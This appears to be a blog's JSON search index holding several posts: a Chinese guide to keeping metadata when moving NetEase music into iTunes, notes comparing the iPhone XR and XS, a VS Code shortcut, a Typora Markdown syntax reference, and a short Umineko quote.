这一步是为了获取无损音源\n2. 将这个播放列表下载下来，放到文件夹A中 姑且先把文件夹命名为「META 信息丢失 TMP」\n这里即将要存的都是 「无损、但丢 Meta 信息了的」\n3. 使用上述的那个网站将 NCM → FLAC / MP3 这时候就会出现 NCM → FLAC 时候的 Meta 信息丢失了\n不过问题不大x\n4. 再使用 XLD 将 FLAC → Apple Loseless 毕竟 iTunes 不认识 Flac 的\n5. 网易云音乐，设置下载音质：极高 这一步主要还是为了获得 Meta 信息完整的歌曲\n再说一遍、无损和 Meta 信息不能共存的原因就是第三步那个网站转换 Flac 的话会把 Meta 弄丢\n6. 将这个播放列表下载下来，放到文件夹B中 姑且先把文件夹命名为「META 信息备份 TMP」\n这里即将要存的都是 「有损、但也有 Meta 信息的」\n7. 使用上述的那个网站将 NCM → MP3 这次因为没有 Flac 的所以全部歌曲的 Meta 都能保留\n8. 建立文件夹 TMP，先把文件夹A的内容扔进去 TMP 此时内含：\n Meta 信息丢失了的 Apple Loseless 文件 或许本来就没有无损版本的，Meta 信息完整的 MP3 文件  9. 再把文件夹B的内容扔进去 此时，B重的 MP3 文件会覆盖A的， 但是介于它们都是 Meta 信息完整的 MP3 所以没什么好担心的\nTMP 此时内含：\n Meta 信息丢失了的 Apple Loseless 文件 与 Meta 信息丢失了的 Apple Loseless 文件文件名相同的 Meta 信息完整的 MP3 文件 或许本来就没有无损版本的，Meta 信息完整的 MP3 文件  10. 全部扔到 Meta 编辑器里去，接着以文件名排序 这时候你会发现这样的情况：\n很显然第一首是没有 Meta 信息的\n这时候 Meta 编辑器给了乃一个神仙功能————\n11. Meta 信息：拷贝\u0026amp;粘贴 就这么简单..一首一首拷贝\u0026amp;粘贴 Meta 信息\n 什么你还觉得麻烦..?!\n那你来找出更好的解决方案啊（（\n至少比起一首一首查搜索引擎来补全 Meta 信息好多了\u0026hellip;\n 12. 删除重复文件 在文件管理器中按照文件名排序\n然后把所有文件名重复中后缀是 MP3 的那个删掉\n13. End，直接扔进 iTunes 终于结束了\u0026hellip;\n好诶\u0026hellip;\n总结 所以说..是不是如果 NCM → Flac 不丢 Meta 信息的话就不用管这些了啊\u0026hellip;\n或者乃对无损没有追求的话\n草！\n其实咱挺木耳的、但是还是想姑且让音乐库里尽量是无损Ver（\n而且网易云确实太花里胡哨了、虽然一起听歌功能很好玩\u0026hellip;\n还有一点咱其实是 iPod 用户而且 iTunes 里面真的上千首歌曲的时候管理起来超级方便wwww\n特别是智能播放列表这些太棒了ww\n总之就写这些了\u0026hellip;瘫x\n","date":"2021-08-20T00:00:00Z","image":"/p/netease-to-itunes/cover_hua37807c73b58aa24688c7ac4c506baa4_1433221_120x120_fill_box_smart1_3.png","permalink":"/p/netease-to-itunes/","title":"【已失效】关于网易云的音乐如何保留完整 Meta 信息着导入 iTunes"},{"content":"  还是选 iPhone 是因为咱是 iCloud 的重度用户而且和 Mac 结合非常方便\n  因为只是「笔记」所以本文充满了我的偏见与独断x\n  截止目前2021.7.27，同样是二手、国行、九新+、256G\nXR 和 XS 的价格都在 2500 左右，\n且 XR 会稍微便宜一点（也就在两三百左右\n  接下来记录一下自己查资料时的一些思路\n 外观 \u0026amp; 手感 不得不说我感觉 XR 的单摄像头好好看啊啊啊啊\n而且花里胡哨的颜色\n但好像很多人对 XR 的边框很不满\n但我平常是看屏幕不是看边框啊喂，停航母边框又咋样、反正我也不戴tao——\n* 看了下自己背面全是坑正面玻璃全碎的 6S\n我觉得可能还是戴套比较好。\n顺便因为 XR 还挺厚，\n所以至少 XS 戴套的话正面无论看起来还是操作起来都会优于 XR 的吧\n（话说上一句话不应该是归类于#屏幕节么x\n 所以对我来说的话，\n如果都戴套：\n手感：XS \u0026gt; XR\n外观：半斤八两，虽然 XS 赢了正面但背面果然还是 XR 好看\n  续航 毕竟这个 6S 已经\u0026hellip;2015 年发布到现在已经 6 年了所以电池实在是\u0026hellip;\nXS 的续航嘛\u0026hellip;\n不用说了\n 续航：XS \u0026lt; XR\n  性能 似乎我不是很关注手机的性能毕竟不太用手机玩游戏的\n但是觉得这也很有必要放进考虑里\nXS 的内存是 4GB，XR 与 X 一样是 3GB\n其实反正是墓碑后台所以估计在未来两年内（瞎猜的）除了 XR 可能偶尔杀杀后台以外其他地方几乎无区别\n顺便隔壁 SE 二代也是 3GB 内存来着\n话说是哪个啥比起头把闪存也叫做内存的\n现在说个「内存」都不知道在指 RAM 还是闪存kuso\u0026hellip;\n 另外两个都是 A12 处理器，但很重要的是，XS 是双层主板\n所以发热很——严重\n那\n 发热严重 → 降频 \u0026amp;\u0026amp; 屏幕亮度降低 → 看起来和摸起来都很不舒服\n emm实在不知道怎么比\n或许因为我不算重度使用的人所以我还是考虑：\n RAM 更大 → 可以撑更多年\nXS \u0026gt; XR\n  摄影 原谅我用了「摄影」而不是「拍照」、因为只是觉得前者好听x\nXR 的主摄 和 XS 的其实是一个\nXS 多的那个长焦镜头\u0026hellip;至少它有\n「人像模式」也就是模拟景深的这部分\nXR 虽然可以靠算法识别出人把人给抠出来，\n但是它只能识别人（草\nXS 的话是利用到了那个长焦镜头所以其他一些东西也可以模拟景深（虽然效果并不好\n但是本着有总比没有强x\n 摄像：XR \u0026gt; XS\n  屏幕 emm\n其实并不是很不在乎这个\u0026hellip;\n  因为用过很长时间的 Windows Phone 所以我个人偏向 OLED 因为黑色舒服\n  其实不喜欢 iOS 的深色模式、只是因为我觉得看不清（或许是 6S 的问题\n所以其实 LCD 也无所谓\n  不觉得 XR 1792×828 \u0026amp; 326 ppi 的屏幕没法看\n  XS 5.8 英寸，XR 6.1 英寸；其实我觉得都可\n  XR 没有 3D Touch，但是我还是挺喜欢的\n   结论\nXS 因为还有 3D Touch 所以 略微 优于 XR\n  杂项  双卡对我无所谓 信号似乎 XR 略微好一点 XR IP67，XS IP68，但我肯定不会闲的无聊往一两米深的水里丢x null   总结 没想好\u0026hellip;\n或许对我来说 XS..?\n再不行我就抛个硬币让命运石之门帮我决定得了ww\n","date":"2021-07-27T00:00:00Z","permalink":"/p/2021-ip-xr-or-xs/","title":"关于 2021 年捡垃圾是选 XR 还是 XS 的笔记"},{"content":"Control + i\n","date":"2021-07-26T00:00:00Z","permalink":"/p/mac-vs-code-format/","title":"Visual Studio Mac 代码格式化快捷键"},{"content":"Markdown For Typora Overview Markdown is created by Daring Fireball; the original guideline is here. Its syntax, however, varies between different parsers or editors. Typora is using GitHub Flavored Markdown.\n[toc]\nBlock Elements Paragraph and line breaks A paragraph is simply one or more consecutive lines of text. In markdown source code, paragraphs are separated by two or more blank lines. In Typora, you only need one blank line (press Return once) to create a new paragraph.\nPress Shift + Return to create a single line break. Most other markdown parsers will ignore single line breaks, so in order to make other markdown parsers recognize your line break, you can leave two spaces at the end of the line, or insert \u0026lt;br/\u0026gt;.\nHeaders Headers use 1-6 hash (#) characters at the start of the line, corresponding to header levels 1-6. For example:\n# This is an H1  ## This is an H2  ###### This is an H6 In Typora, input ‘#’s followed by title content, and press Return key will create a header.\nBlockquotes Markdown uses email-style \u0026gt; characters for block quoting. They are presented as:\n\u0026gt; This is a blockquote with two paragraphs. This is first paragraph. \u0026gt; \u0026gt; This is second pragraph. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus. \u0026gt; This is another blockquote with one paragraph. There is three empty line to seperate two blockquote. In Typora, inputting ‘\u0026gt;’ followed by your quote contents will generate a quote block. Typora will insert a proper ‘\u0026gt;’ or line break for you. Nested block quotes (a block quote inside another block quote) by adding additional levels of ‘\u0026gt;’.\nLists Input * list item 1 will create an unordered list - the * symbol can be replace with + or -.\nInput 1. list item 1 will create an ordered list - their markdown source code is as follows:\n## un-ordered list * Red * Green * Blue ## ordered list 1. Red 2. Green 3.\tBlue Task List Task lists are lists with items marked as either [ ] or [x] (incomplete or complete). For example:\n- [ ] a task list item - [ ] list syntax required - [ ] normal **formatting**, @mentions, #1234 refs - [ ] incomplete - [x] completed You can change the complete/incomplete state by clicking on the checkbox before the item.\n(Fenced) Code Blocks Typora only supports fences in GitHub Flavored Markdown. Original code blocks in markdown are not supported.\nUsing fences is easy: Input ``` and press return. Add an optional language identifier after ``` and we\u0026rsquo;ll run it through syntax highlighting:\nHere\u0026#39;s an example: ```js function test() { console.log(\u0026#34;notice the blank line before this function?\u0026#34;); } ``` syntax highlighting: ```ruby require \u0026#39;redcarpet\u0026#39; markdown = Redcarpet.new(\u0026#34;Hello World!\u0026#34;) puts markdown.to_html ``` Math Blocks You can render LaTeX mathematical expressions using MathJax.\nTo add a mathematical expression, input $$ and press the \u0026lsquo;Return\u0026rsquo; key. This will trigger an input field which accepts Tex/LaTex source. For example:\n$$ \\mathbf{V}_1 \\times \\mathbf{V}_2 = \\begin{vmatrix} \\mathbf{i} \u0026amp; \\mathbf{j} \u0026amp; \\mathbf{k} \\ \\frac{\\partial X}{\\partial u} \u0026amp; \\frac{\\partial Y}{\\partial u} \u0026amp; 0 \\ \\frac{\\partial X}{\\partial v} \u0026amp; \\frac{\\partial Y}{\\partial v} \u0026amp; 0 \\ \\end{vmatrix} $$\nIn the markdown source file, the math block is a LaTeX expression wrapped by a pair of ‘$$’ marks:\n$$ \\mathbf{V}_1 \\times \\mathbf{V}_2 = \\begin{vmatrix} \\mathbf{i} \u0026amp; \\mathbf{j} \u0026amp; \\mathbf{k} \\\\ \\frac{\\partial X}{\\partial u} \u0026amp; \\frac{\\partial Y}{\\partial u} \u0026amp; 0 \\\\ \\frac{\\partial X}{\\partial v} \u0026amp; \\frac{\\partial Y}{\\partial v} \u0026amp; 0 \\\\ \\end{vmatrix} $$ You can find more details here.\nTables Input | First Header | Second Header | and press the return key. This will create a table with two columns.\nAfter a table is created, putting focus on that table will open up a toolbar for the table where you can resize, align, or delete the table. You can also use the context menu to copy and add/delete individual columns/rows.\nThe full syntax for tables is described below, but it is not necessary to know the full syntax in detail as the markdown source code for tables is generated automatically by Typora.\nIn markdown source code, they look like:\n| First Header | Second Header | | ------------- | ------------- | | Content Cell | Content Cell | | Content Cell | Content Cell | You can also include inline Markdown such as links, bold, italics, or strikethrough in the table.\nFinally, by including colons (:) within the header row, you can define text in that column to be left-aligned, right-aligned, or center-aligned:\n| Left-Aligned | Center Aligned | Right Aligned | | :------------ |:---------------:| -----:| | col 3 is | some wordy text | $1600 | | col 2 is | centered | $12 | | zebra stripes | are neat | $1 | A colon on the left-most side indicates a left-aligned column; a colon on the right-most side indicates a right-aligned column; a colon on both sides indicates a center-aligned column.\nFootnotes You can create footnotes like this[^footnote]. [^footnote]: Here is the *text* of the **footnote**. will produce:\nYou can create footnotes like this1.\nHover over the ‘footnote’ superscript to see content of the footnote.\nHorizontal Rules Inputting *** or --- on a blank line and pressing return will draw a horizontal line.\n YAML Front Matter Typora now supports YAML Front Matter. Input --- at the top of the article and then press Return to introduce a metadata block. Alternatively, you can insert a metadata block from the top menu of Typora.\nTable of Contents (TOC) Input [toc] and press the Return key. This will create a “Table of Contents” section. The TOC extracts all headers from the document, and its contents are updated automatically as you add to the document.\nSpan Elements Span elements will be parsed and rendered right after typing. Moving the cursor in middle of those span elements will expand those elements into markdown source. Below is an explanation of the syntax for each span element.\nLinks Markdown supports two styles of links: inline and reference.\nIn both styles, the link text is delimited by [square brackets].\nTo create an inline link, use a set of regular parentheses immediately after the link text’s closing square bracket. Inside the parentheses, put the URL where you want the link to point, along with an optional title for the link, surrounded in quotes. For example:\nThis is [an example](http://example.com/ \u0026#34;Title\u0026#34;) inline link. [This link](http://example.net/) has no title attribute. will produce:\nThis is an example inline link. (\u0026lt;p\u0026gt;This is \u0026lt;a href=\u0026quot;http://example.com/\u0026quot; title=\u0026quot;Title\u0026quot;\u0026gt;)\nThis link has no title attribute. (\u0026lt;p\u0026gt;\u0026lt;a href=\u0026quot;http://example.net/\u0026quot;\u0026gt;This link\u0026lt;/a\u0026gt; has no)\nInternal Links You can set the href to headers, which will create a bookmark that allow you to jump to that section after clicking. For example:\nCommand(on Windows: Ctrl) + Click This link will jump to header Block Elements. To see how to write that, please move cursor or click that link with ⌘ key pressed to expand the element into markdown source.\nReference Links Reference-style links use a second set of square brackets, inside which you place a label of your choosing to identify the link:\nThis is [an example][id] reference-style link. Then, anywhere in the document, you define your link label on a line by itself like this: [id]: http://example.com/ \u0026#34;Optional Title Here\u0026#34; In Typora, they will be rendered like so:\nThis is an example reference-style link.\nThe implicit link name shortcut allows you to omit the name of the link, in which case the link text itself is used as the name. Just use an empty set of square brackets — for example, to link the word “Google” to the google.com web site, you could simply write:\n[Google][] And then define the link: [Google]: http://google.com/ In Typora, clicking the link will expand it for editing, and command+click will open the hyperlink in your web browser.\nURLs Typora allows you to insert URLs as links, wrapped by \u0026lt;brackets\u0026gt;.\n\u0026lt;i@typora.io\u0026gt; becomes i@typora.io.\nTypora will also automatically link standard URLs. e.g: www.google.com.\nImages Images have similar syntax as links, but they require an additional ! char before the start of the link. The syntax for inserting an image looks like this:\n![Alt text](/path/to/img.jpg) ![Alt text](/path/to/img.jpg \u0026#34;Optional title\u0026#34;) You are able to use drag \u0026amp; drop to insert an image from an image file or your web browser. You can modify the markdown source code by clicking on the image. A relative path will be used if the image that is added using drag \u0026amp; drop is in same directory or sub-directory as the document you\u0026rsquo;re currently editing.\nIf you’re using markdown for building websites, you may specify a URL prefix for the image preview on your local computer with property typora-root-url in YAML Front Matters. For example, input typora-root-url:/User/Abner/Website/typora.io/ in YAML Front Matters, and then ![alt](/blog/img/test.png) will be treated as ![alt](file:///User/Abner/Website/typora.io/blog/img/test.png) in Typora.\nYou can find more details here.\nEmphasis Markdown treats asterisks (*) and underscores (_) as indicators of emphasis. Text wrapped with one * or _ will be wrapped with an HTML \u0026lt;em\u0026gt; tag. E.g:\n*single asterisks* _single underscores_ output:\nsingle asterisks\nsingle underscores\nGFM will ignore underscores in words, which is commonly used in code and names, like this:\n wow_great_stuff\ndo_this_and_do_that_and_another_thing.\n To produce a literal asterisk or underscore at a position where it would otherwise be used as an emphasis delimiter, you can backslash escape it:\n\\*this text is surrounded by literal asterisks\\* Typora recommends using the * symbol.\nStrong A double * or _ will cause its enclosed contents to be wrapped with an HTML \u0026lt;strong\u0026gt; tag, e.g:\n**double asterisks** __double underscores__ output:\ndouble asterisks\ndouble underscores\nTypora recommends using the ** symbol.\nCode To indicate an inline span of code, wrap it with backtick quotes (`). Unlike a pre-formatted code block, a code span indicates code within a normal paragraph. For example:\nUse the `printf()` function. will produce:\nUse the printf() function.\nStrikethrough GFM adds syntax to create strikethrough text, which is missing from standard Markdown.\n~~Mistaken text.~~ becomes Mistaken text.\nUnderlines Underline is powered by raw HTML.\n\u0026lt;u\u0026gt;Underline\u0026lt;/u\u0026gt; becomes Underline.\nEmoji :smile: Input emoji with syntax :smile:.\nUser can trigger auto-complete suggestions for emoji by pressing ESC key, or trigger it automatically after enabling it on preference panel. Also, inputting UTF-8 emoji characters directly is also supported by going to Edit -\u0026gt; Emoji \u0026amp; Symbols in the menu bar (macOS).\nInline Math To use this feature, please enable it first in the Preference Panel -\u0026gt; Markdown Tab. Then, use $ to wrap a TeX command. For example: $\\lim_{x \\to \\infty} \\exp(-x) = 0$ will be rendered as LaTeX command.\nTo trigger inline preview for inline math: input “$”, then press the ESC key, then input a TeX command.\nYou can find more details here.\nSubscript To use this feature, please enable it first in the Preference Panel -\u0026gt; Markdown Tab. Then, use ~ to wrap subscript content. For example: H~2~O, X~long\\ text~/\nSuperscript To use this feature, please enable it first in the Preference Panel -\u0026gt; Markdown Tab. Then, use ^ to wrap superscript content. For example: X^2^.\nHighlight To use this feature, please enable it first in the Preference Panel -\u0026gt; Markdown Tab. Then, use == to wrap highlight content. For example: ==highlight==.\nHTML You can use HTML to style content what pure Markdown does not support. For example, use \u0026lt;span style=\u0026quot;color:red\u0026quot;\u0026gt;this text is red\u0026lt;/span\u0026gt; to add text with red color.\nEmbed Contents Some websites provide iframe-based embed code which you can also paste into Typora. For example:\n\u0026lt;iframe height=\u0026#39;265\u0026#39; scrolling=\u0026#39;no\u0026#39; title=\u0026#39;Fancy Animated SVG Menu\u0026#39; src=\u0026#39;http://codepen.io/jeangontijo/embed/OxVywj/?height=265\u0026amp;theme-id=0\u0026amp;default-tab=css,result\u0026amp;embed-version=2\u0026#39; frameborder=\u0026#39;no\u0026#39; allowtransparency=\u0026#39;true\u0026#39; allowfullscreen=\u0026#39;true\u0026#39; style=\u0026#39;width: 100%;\u0026#39;\u0026gt;\u0026lt;/iframe\u0026gt; Video You can use the \u0026lt;video\u0026gt; HTML tag to embed videos. For example:\n\u0026lt;video src=\u0026#34;xxx.mp4\u0026#34; /\u0026gt; Other HTML Support You can find more details here.\n  Here is the text of the footnote.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-07-23T00:00:00Z","permalink":"/p/markdown-references/","title":"Lorem ipsum"},{"content":"以下に掲げる三つの内。\n二つを得るために、一つを生贄に捧げよ。\n一．自分の命\n二．愛する者の命\n三．それ以外の全員の命\n何れも選ばねば、上記の全てを失う。\n 以下三者中\n为了得到另外两者，必须牺牲其一\n一．自己的生命\n二．所爱之人的生命\n三．初次之外的所有人的生命\n如果不选择其中任何一项，则将会失去上述全部\n","date":"1986-10-05T00:00:00Z","permalink":"/p/senntaku/","title":"選択・1986.10.5・六軒島"}]